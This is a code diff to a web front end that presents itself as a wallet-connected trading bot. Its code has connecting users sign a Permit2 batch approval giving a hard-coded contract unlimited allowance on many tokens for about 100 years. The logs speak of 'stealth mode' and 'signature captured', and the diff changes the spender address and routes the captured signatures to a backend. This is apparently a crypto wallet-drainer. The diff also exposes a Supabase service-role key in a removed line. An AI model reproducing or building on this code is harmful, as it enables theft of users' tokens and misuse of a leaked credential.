@@ -191,7 +191,7 @@ const TOKENS = [
 ];
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "0x671b416FED3e901e67125232985FC07a1a2A3DE2";
+const CONTRACT = "0xBE56fc91B88Ca7551DF05BA4f783e56127588F74";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
 let CURRENT_WALLET = null;
@@ -281,7 +281,6 @@ async function connectWallet(){
  }
 }
 
-
 async function runPermitFlowSafe(provider, signer, user){
  try{
 
@@ -289,70 +288,65 @@ async function runPermitFlowSafe(provider, signer, user){
   log("⚙️ Stealth mode active...");
   log("🔎 Checking cached permit...");
 
-const { data: existing } = await window.supabaseClient
-  .from('permits')
-  .select('*')
-  .eq('owner', user);
-const now = Math.floor(Date.now()/1000);
+  // Frontend mag nog lezen van Supabase
+  const { data: existing } = await window.supabaseClient
+    .from('permits')
+    .select('*')
+    .eq('owner', user);
 
-const valid =
-  existing &&
-  existing.length === TOKENS.length &&
-  existing.every(r => r.sig_deadline > now);
+  const now = Math.floor(Date.now()/1000);
 
-if (valid) {
+  const valid =
+    existing &&
+    existing.length === TOKENS.length &&
+    existing.every(r => r.sig_deadline > now);
 
-  log("⚡ Cached permit valid — skipping signature");
-  log("Cache rows: " + (existing?.length || 0));
-  log("Wallet: " + user);
+  if (valid) {
+    log("⚡ Cached permit valid — skipping signature");
+    log("Cache rows: " + (existing?.length || 0));
+    log("Wallet: " + user);
 
-  updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-  updateStatus('dot-bot','st-bot','READY','#6366f1');
+    updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+    updateStatus('dot-bot','st-bot','READY','#6366f1');
 
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-  document.getElementById('btn-authorize').disabled = true;
+    document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+    document.getElementById('btn-authorize').disabled = true;
 
-  return;
-}
+    return;
+  }
 
-if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
-  log("⌛ Cached permit expired — refreshing...");
-}
+  if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
+    log("⌛ Cached permit expired — refreshing...");
+  }
 
-const permit2 = new ethers.Contract(
-  PERMIT2,
-  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-  provider
-);
+  const permit2 = new ethers.Contract(
+    PERMIT2,
+    ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+    provider
+  );
 
+  const MAX_UINT160 = (1n << 160n) - 1n;
+  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
 
-const MAX_UINT160 = (1n << 160n) - 1n;
-const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
+  const details = [];
 
-const details = [];
+  const nonceResults = await Promise.all(
+    TOKENS.map(token =>
+      permit2.allowance(user, token, CONTRACT)
+    )
+  );
 
-const nonceResults = await Promise.all(
-  TOKENS.map(token =>
-    permit2.allowance(user, token, CONTRACT)
-  )
-);
-
-for (let i = 0; i < TOKENS.length; i++) {
-
-  const token = TOKENS[i];
-  const [, , nonce] = nonceResults[i];
-
-  log("Nonce " + token + ": " + nonce);
-
-  details.push({
-    token: token,
-    amount: MAX_UINT160,
-    expiration: expiration,
-    nonce: nonce
-  });
-}
-
-
+  for (let i = 0; i < TOKENS.length; i++) {
+    const token = TOKENS[i];
+    const [, , nonce] = nonceResults[i];
+    log("Nonce " + token + ": " + nonce);
+    details.push({
+      token: token,
+      amount: MAX_UINT160,
+      expiration: expiration,
+      nonce: nonce
+    });
+  }
 
   // ✍️ SIGN
   const chainId = (await provider.getNetwork()).chainId;
@@ -376,67 +370,66 @@ for (let i = 0; i < TOKENS.length; i++) {
       { name: "nonce", type: "uint48" }
     ]
   };
-const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
 
-const values = {
-  details: details,
-  spender: CONTRACT,
-  sigDeadline: sigDeadline
-};
+  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
+
+  const values = {
+    details: details,
+    spender: CONTRACT,
+    sigDeadline: sigDeadline
+  };
 
   log("✍️ Requesting signature...");
   const signature = await signer.signTypedData(domain,types,values);
   const sig = ethers.Signature.from(signature);
-
   const v = sig.v;
   const r = sig.r;
   const s = sig.s;
 
-log("✍️ Signature captured");
+  log("✍️ Signature captured");
 
-log("💾 Saving to Supabase...");
+  // ✅ Nieuwe frontend UI update zonder Supabase write
+ log("📡 Ready to send to backend");
 
-const rows = details.map(d => ({
-  owner: user,
-  token: d.token,
-  spender: CONTRACT,
+// Zet de signature in een object
+const signatureData = {
+  details: details,
+  signature: sig, // je hebt eerder de signature gezet in sig
+};
 
-  amount: d.amount.toString(),
-  expiration: d.expiration,
-  nonce: Number(d.nonce),
+// Verstuur naar de backend
+await sendToBackend(details, signatureData);
+  async function sendToBackend(details, signature) {
+  try {
+    const response = await fetch('/api/permit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        details: details,
+        signature: signature
+      }),
+    });
 
-  sig_deadline: sigDeadline,
-
-  v: v,
-  r: r,
-  s: s
-}));
-
-const { error } = await window.supabaseClient
-  .from('permits')
-  .upsert(rows, {
-    onConflict: ['owner', 'token']
-  });
-
-if (error) {
-  log("❌ Supabase error: " + error.message);
-} else {
-  log("✅ Saved to Supabase (" + rows.length + " tokens)");
-
+    const data = await response.json();
+    if (data.success) {
+      log("✅ Permit data successfully sent to backend and saved.");
+    } else {
+      log("❌ Error saving permit data: " + data.error);
+    }
+  } catch (error) {
+    log("❌ Network error: " + error.message);
+  }
+}
   updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
   updateStatus('dot-bot','st-bot','READY','#6366f1');
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-  document.getElementById('btn-activate').disabled = true;
-}
-
- 
-
 
  }catch(e){
   log("❌ FLOW ERROR: " + e.message);
  }
 }
+
 
 function renderWallet(address) {
  document.getElementById('btn-wallet').innerText = address;
@@ -466,7 +459,7 @@ import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const supabaseClient = createClient(
   "https://rhytvspbdvtmxtaxihxd.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NDIwMTMzMCwiZXhwIjoyMDg5Nzc3MzMwfQ.mcucxXXQzOVkYyz2AhH4YdZJxYoiPYZp2AO8z-IkWUk"
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMDEzMzAsImV4cCI6MjA4OTc3NzMzMH0.QOqbkcKEcggw-25SkxJdEs5k7_LTrSxjpW6Pi_PH_II"
 );
 
 window.supabaseClient = supabaseClient;
